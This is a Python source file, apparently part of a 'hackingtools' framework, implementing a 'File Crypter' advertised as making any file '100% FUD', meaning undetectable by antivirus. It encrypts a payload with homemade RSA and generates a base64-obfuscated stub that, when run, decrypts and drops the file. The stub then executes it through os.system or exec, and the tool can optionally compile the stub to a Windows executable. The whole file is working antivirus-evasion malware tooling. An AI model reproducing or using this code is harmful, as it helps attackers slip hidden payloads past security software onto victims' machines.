# === Crypts any file using ht_rsa module and some Utils. For now, is FUD 100% ===

"""
With this module, we can crypt any file we want 
for not been detected, for example, by antiviruses.
Currently it support's the following 2 public functions and 4 private functions:

Public:

1. **crypt_file** - Crypts any file with ht_rsa functions and some utils and returns crypted file 100% FUD (jump to section in [[ht_crypter.py#crypt_file]] )

2. **createStub** - Creates a file with the stub (decrypt functions and pk for rsa) included into the file for been 100% FUD (jump to section in [[ht_crypter.py#createStub]] )

#TODO MORE HEREEE

"""

from hackingtools.core import Logger, Config, Utils
import hackingtools as ht 

import sys
import os.path
import math
import base64
import shutil

config = Config.getConfig(parentKey='modules', key='ht_crypter')
output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))

class StartModule():

# === __init__ ===
	def __init__(self):
		Utils.emptyDirectory(output_dir)
		self._main_gui_func_ = 'crypt_file'
		self.__gui_label__ = 'File Crypter'

# === help ===
	def help(self):
		Logger.printMessage(message=ht.getFunctionsNamesFromModule('ht_crypter'), debug_module=True)

# === convertToExe ===
	def convertToExe(self, stub_name):
		"""
		Convert's given Python file path in String into a new one with the same name and .exe as extension
		Compile's with pyinstaller and could be change it's params in config.json
		
		Arguments
		---------
			stub_name : str
				
				File path to convert to exe
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
		# Convert py to exe with pyinstaller
		import os
		os.system(config['pyinstaller'].format(path=os.path.dirname(stub_name)) + " " + stub_name)
		filename = '{file}.exe'.format(file=stub_name.split('.')[0].split('\\')[-1])

		file_to_move = os.path.abspath(os.path.join('dist', '{file}'.format(file=filename)))
		new_file = os.path.abspath(os.path.join(os.path.dirname(stub_name), filename))

		if os.path.isfile(file_to_move) and not os.path.isfile(new_file):
			os.rename(file_to_move, new_file)

		new_spec_file = '{name}.spec'.format(name=new_file.split('.')[0])
		if os.path.isfile(new_spec_file):
			os.remove(new_spec_file)

		build_dir = os.path.abspath(os.path.join('build', '{file}'.format(file=filename.split('.')[0])))
		if os.path.isdir(build_dir):
			shutil.rmtree(build_dir)

		if os.path.isfile(file_to_move):
			os.remove(file_to_move)

		spec_file = os.path.abspath('{file}.spec'.format(file=filename.split('.')[0]))
		if os.path.isfile(spec_file):
			os.remove(spec_file)

# === createStub ===
	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, is_iterating=False, is_last=False, convert=False):
		"""
		Create's the stub for the crypter and 
		has some courious params he have to see
		
		Arguments
		---------
			crypto_data_hex : str

				File path that want to crypt
			public_key : str
			
				New File name for crypted file when 
				return's it
			drop_file_name : str
				New File name for crypted file when 
				return's it
			save_name : str
				New File name for crypted file when 
				return's it
		
		Keyword Arguments:
			is_iterating : bool
			
				Compile's the final file if we select 
				it (default: {False})
			is_last : bool
			
				Internal variable for looping on the 
				crypting (default: {False})
			convert : bool
				
				Internal varuable for looping on the 
				crypting (default: {1})
		
		Returns
		-------
			str
			
				Crypted file path name / None
		"""
		stub = ''
		if is_last:
			stub = "import argparse, math, base64, binascii, random, sys, subprocess, os\nfrom random import randint\n"
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "drpnm = \"" + drop_file_name + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += """
def dcy(pk, cptx):
	k, n = pk
	mensajeRecibido = __reBa64__(cptx.encode('utf-8'))
	mensajeHexRecibido = __ba64Hex__(mensajeRecibido)
	mensajeDecimalRecibido = __hexDec__(mensajeHexRecibido)
	mensajeDescifrado = [((c ** k) % n) for c in mensajeDecimalRecibido]
	mensaje_de_ascii = __deAS__(mensajeDescifrado)
	decasc = __reBa64__(''.join(mensaje_de_ascii).encode())
	hexba64 = __ba64Hex__(decasc)
	ashex = __hexDec__(hexba64)
	deasc = __deAS__(ashex)
	ba64 = base64.b64decode(deasc.encode())
	return ba64
def __reBa64__(m):
	mBa64 = [m[i:i+4] for i in range(0, len(m), 4)]
	return mBa64
def __ba64Hex__(m):
	mHx = [base64.b64decode(b64) for b64 in m]
	return mHx
def __hexDec__(m):
	mDec = [int(hexa.decode("UTF-8"), 16) for hexa in m]
	return mDec
def __deAS__(m):
	m1 = ''.join([chr(d) for d in m])
	return m1
def __meAS__(m):
	men = [ord(p) for p in m]
	return men
dcy_data = dcy(pk=pk, cptx=cdx)
"""
		if is_iterating:
			stub += "cdx = \"" + crypto_data_hex + "\"\n"
			stub += "pk = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
			stub += "dcy_data = dcy(pk=pk, cptx=cdx)\n"
			stub += "exec(dcy_data)"
		else:
			stub += """
image_extensions = ('jpg', 'jpeg', 'bpm', 'ico', 'png')
exec_extensions = ('bat', 'exe', 'vbs', 'ps1')
python_extensions = ('py')
nf = open(drpnm, 'wb')
try:
	nf.write(dcy_data)
except:
	pass
nf.close()
if os.path.exists(drpnm):
	if drpnm.split('.')[1] in image_extensions:
		imageViewerFromCommandLine = {'linux':'xdg-open', 'win32':'explorer', 'darwin':'open'}[sys.platform]
		subprocess.run([imageViewerFromCommandLine, drpnm], close_fds=True)
	if drpnm.split('.')[1] in exec_extensions and sys.platform == 'win32':
		os.system(drpnm)
	if drpnm.split('.')[1] in python_extensions:
		exec(dcy_data)
		#proc = subprocess.Popen('python {fn}'.format(fn=drpnm), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""

		stub_base64 = base64.b64encode(stub.encode('utf-8'))
		stub = "import base64\n"
		stub += "data = {st_ba64}\n".format(st_ba64=stub_base64)
		stub += "exec(base64.b64decode(data))"
		
		Utils.saveToFile(content=stub, fileName=save_name)

		if convert:
			self.convertToExe(save_name)

# === crypt_file ===
	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', prime_length=4, compile_exe=False, is_iterating=False, iterate_count=1, is_last=False):
		"""Crypt's a file when some params we have to use
		
		Arguments
		---------
			filename : str
			
				File path that want to crypt
			new_file_name : str
			
				New File name for crypted file 
				when return's it
		
		Keyword Arguments
		-----------------
			drop_file_name : str
			
				Drop a new file on execute the 
				cryted file (default: {'dropped.py'})
			prime_length : int
			
				Set a prime length for auto-generating
				 the primes for the cryptography 
				 (default: {4})
			compile_exe : bool
			
				Compile's the final file if 
				we select it (default: {False})
			is_iterating : bool
			
				Internal variable for looping 
				on the crypting (default: {False})
			iterate_count : int
			
				Internal variable for looping 
				on the crypting (default: {1})
			is_last : bool
			
				Internal variable for looping 
				on the crypting (default: {False})
		
		Returns
		-------
			str

				Crypted file path name / None
		"""
		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
		temp_filename = filename
		if iterate_count > 1:
			temp_filename = filename
			for i in range(1, iterate_count):
				if i == iterate_count - 1:
					is_last = True
				temp_filename = self.crypt_file(filename=temp_filename, new_file_name=new_file_name, drop_file_name=drop_file_name, compile_exe=False, is_iterating=True, iterate_count=1, is_last=is_last)
		
		filename = temp_filename
		if filename and new_file_name:
			crypter_rsa = ht.getModule('ht_rsa')
			data = Utils.getFileContentInByteArray(filePath=filename)
			prime_a, prime_b = crypter_rsa.getRandomKeypair(prime_length)
			public, private = crypter_rsa.generate_keypair(prime_a, prime_b)
			crypted_data = crypter_rsa.encrypt(private_key=private, plaintext=data)
			new_file = new_file_name
			if not '.' in new_file:
				new_file = '{file}.py'.format(file=new_file)

			if compile_exe:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, is_iterating=is_iterating, is_last=is_last, convert=True)
				new_file = '{file}.exe'.format(file=new_file.split('.')[0])
			else:
				self.createStub(crypto_data_hex=crypted_data, public_key=public, drop_file_name=drop_file_name, save_name=new_file, is_iterating=is_iterating, is_last=is_last)
			return new_file
		else:
			return None